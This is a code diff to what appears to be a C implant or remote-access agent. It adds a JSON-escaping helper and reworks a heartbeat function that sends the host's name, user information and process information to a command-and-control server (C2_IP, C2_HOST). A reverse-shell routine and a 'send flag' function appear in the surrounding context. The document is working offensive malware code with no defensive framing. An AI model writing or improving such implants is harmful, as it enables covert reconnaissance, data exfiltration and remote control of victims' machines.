@@ -54,7 +54,7 @@ char* getHostname() {
     return buf;
 }
 
-char* getCurrentUserInfo() {
+char* getUserInfo() {
     static char buffer[256];
     uid_t uid = getuid();
     struct passwd *pw = getpwuid(uid);
@@ -91,6 +91,31 @@ char* getProcessInfo() {
     return buffer;
 }
 
+void jsonStringsEscape(const char *src, char *dst, size_t dst_size) {
+    size_t j = 0;
+    for (size_t i = 0; src[i] && j < dst_size - 2; i++) {
+        switch (src[i]) {
+            case '"':
+            case '\\':
+                if (j < dst_size - 2) dst[j++] = '\\';
+                dst[j++] = src[i];
+                break;
+            case '\n':
+                if (j < dst_size - 2) { dst[j++] = '\\'; dst[j++] = 'n'; }
+                break;
+            case '\r':
+                if (j < dst_size - 2) { dst[j++] = '\\'; dst[j++] = 'r'; }
+                break;
+            case '\t':
+                if (j < dst_size - 2) { dst[j++] = '\\'; dst[j++] = 't'; }
+                break;
+            default:
+                if ((unsigned char)src[i] >= 32) dst[j++] = src[i];
+                break;
+        }
+    }
+    dst[j] = '\0';
+}
 
 void initiateDirectReverseShell(char *reverseShellInfo) {
     if (!reverseShellInfo) return;
@@ -138,10 +163,18 @@ int httpSendFlag(const char *flag) {
 }
 
 int httpSendHeartbeat() {
-    char data[512];
+    char data[768];
+    char hostnameEscaped[256];
+    char userinfoEscaped[256];
+    char processinfoEscaped[256];
+
+    jsonStringsEscape(getHostname(), hostnameEscaped, sizeof(hostnameEscaped));
+    jsonStringsEscape(getUserInfo(), userinfoEscaped, sizeof(userinfoEscaped));
+    jsonStringsEscape(getProcessInfo(), processinfoEscaped, sizeof(processinfoEscaped));
+
     snprintf(data, sizeof(data),
              "{\"hostname\":\"%s\",\"userinfo\":\"%s\",\"processinfo\":\"%s\"}",
-             getHostname(), getCurrentUserInfo(), getProcessInfo());
+             hostnameEscaped, userinfoEscaped, processinfoEscaped);
 
     HTTPRequestInfo req = {
         C2_IP, C2_HOST, C2_PORT, -1,
